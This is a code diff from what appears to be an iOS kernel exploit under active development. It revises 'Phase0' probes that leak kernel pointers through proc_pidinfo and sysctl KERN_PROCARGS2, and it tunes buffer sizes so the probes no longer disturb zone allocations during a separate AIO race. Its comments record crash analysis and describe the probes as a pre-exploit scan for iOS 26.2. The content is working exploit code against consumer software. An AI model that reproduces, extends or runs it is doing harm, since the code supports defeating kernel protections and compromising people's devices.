@@ -254,8 +254,9 @@ struct aio_race_state {
     ssize_t return_result;  // v47: aio_return result or aio_read errno (diagnostics)
 };
 
-// v67: v66 + exhaustive proc_pidinfo (flavors 1-25 × PIDs 0/1/self) + KERN_PROCARGS2 sysctl probe.
-// v66's FastPath-only probe failed with exclusive-access on iOS 26.2.
+// v67.1: hotfix — remove PID 0 query (dangerous), shrink buffers (zone-safe). v67
+// crashed at FAR=0x58: proc_pidinfo on kernel_task disturbed AIO zone magazines,
+// causing reclaimed entry to have NULL procp during filt_aioprocess TAILQ_REMOVE.
 // independent leak channels: (A) sysctl tcp.info, (B) proc_pidinfo,
 // (C) non-FastPath IOKit enumeration, (D) mach_port_kobject. Each probe
 // dumps its full return buffer and scans for 0xFFFFFE/0xFFFFFF patterns.
@@ -6124,22 +6125,23 @@ static void *e2_free_and_ool_racer(void *arg) {
     close(connFd); close(accepted); close(listenFd);
 }
 
-// Sub-test B: proc_pidinfo — exhaustive flavor×PID scan for kernel pointers
+// Sub-test B: proc_pidinfo — safe pre-exploit scan (no PID 0, small buffers)
 - (void)subtestProcPidinfo {
     ProcPidinfoFn f = (ProcPidinfoFn)dlsym(RTLD_DEFAULT, "proc_pidinfo");
     if (!f) { [self appendLog:@"Phase0.B: proc_pidinfo not available"]; return; }
 
-    int pids[] = {0, 1, getpid()};
-    const char *pidLabels[] = {"kernel", "launchd", "self"};
-    size_t bufSize = 16384;
+    // PID 0 (kernel_task) is DANGEROUS — causes zone disturbance → AIO race fails
+    int pids[] = {1, getpid()};
+    const char *pidLabels[] = {"launchd", "self"};
+    size_t bufSize = 2048;  // small buffer — avoid zone magazine disturbance
 
-    for (int pi = 0; pi < 3; pi++) {
+    for (int pi = 0; pi < 2; pi++) {
         int pid = pids[pi];
         uint8_t *buf = (uint8_t *)calloc(1, bufSize);
         if (!buf) continue;
 
         int tested = 0;
-        for (int flavor = 1; flavor <= 25; flavor++) {
+        for (int flavor = 1; flavor <= 8; flavor++) {
             memset(buf, 0, bufSize);
             int ret = f(pid, flavor, 0, buf, (uint32_t)bufSize);
             if (ret <= 0 || ret >= (int)bufSize) continue;
@@ -6152,31 +6154,29 @@ static void *e2_free_and_ool_racer(void *arg) {
                     flavor, pid, ret, [self hexPreview:buf length:dumpLen]]];
             }
         }
-        [self appendLog:[NSString stringWithFormat:@"Phase0.B pid=%d(%s): %d/25 flavors returned data", pid, pidLabels[pi], tested]];
+        [self appendLog:[NSString stringWithFormat:@"Phase0.B pid=%d(%s): %d/8 flavors returned data", pid, pidLabels[pi], tested]];
         free(buf);
     }
 }
 
-// Sub-test B2: sysctl KERN_PROCARGS2 — known vector for uninitialized kernel memory
+// Sub-test B2: sysctl KERN_PROCARGS2 — known uninitialized kernel memory leak vector
 - (void)subtestKernProcargs {
     [self appendLog:@"Phase0.B2 KERN_PROCARGS2: probing..."];
 
-    int mib[] = {CTL_KERN, KERN_PROCARGS2, 0}; // KERN_PROCARGS2=49 on recent xnu
-    for (int pid = 0; pid <= 2; pid++) {
-        mib[2] = pid;
-        size_t len = 65536;
-        uint8_t *buf = (uint8_t *)calloc(1, len);
+    int mib[] = {CTL_KERN, KERN_PROCARGS2, 0};
+    size_t bufSize = 8192;  // moderate buffer — zone-safe
+    for (int pi = 0; pi < 2; pi++) {
+        mib[2] = (pi == 0) ? getpid() : 1;
+        uint8_t *buf = (uint8_t *)calloc(1, bufSize);
         if (!buf) continue;
 
+        size_t len = bufSize;
         if (sysctl(mib, 3, buf, &len, NULL, 0) == 0 && len > 0) {
-            [self appendLog:[NSString stringWithFormat:@"Phase0.B2 pid=%d: %zu bytes", pid, len]];
-            size_t dumpLen = MIN(len, (size_t)256);
-            [self appendLog:[NSString stringWithFormat:@"Phase0.B2 pid=%d[0..%zu]: %@",
-                pid, dumpLen - 1, [self hexPreview:buf length:dumpLen]]];
+            [self appendLog:[NSString stringWithFormat:@"Phase0.B2 pid=%d: %zu bytes", mib[2], len]];
             [self scanBufferForKernelPointers:buf length:len
-                label:[NSString stringWithFormat:@"kern.procargs2.p%d", pid]];
+                label:[NSString stringWithFormat:@"kern.procargs2.p%d", mib[2]]];
         } else {
-            [self appendLog:[NSString stringWithFormat:@"Phase0.B2 pid=%d: failed (errno=%d)", pid, errno]];
+            [self appendLog:[NSString stringWithFormat:@"Phase0.B2 pid=%d: failed (errno=%d)", mib[2], errno]];
         }
         free(buf);
     }
